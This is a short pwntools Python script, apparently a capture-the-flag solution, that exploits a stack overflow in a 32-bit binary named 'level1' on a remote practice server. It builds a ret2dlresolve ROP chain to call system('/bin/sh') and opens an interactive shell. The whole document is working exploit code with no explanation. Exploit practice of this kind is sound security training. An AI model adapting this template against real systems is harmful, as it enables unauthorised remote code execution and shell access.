from pwn import *

context.arch = 'i386'
elf = ELF('./level1')
rop = ROP(elf)

r = remote('node3.buuoj.cn', 25382)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

r.send(fit({0x8C: rop.chain(), 0x100: dlresolve.payload}))
r.interactive()
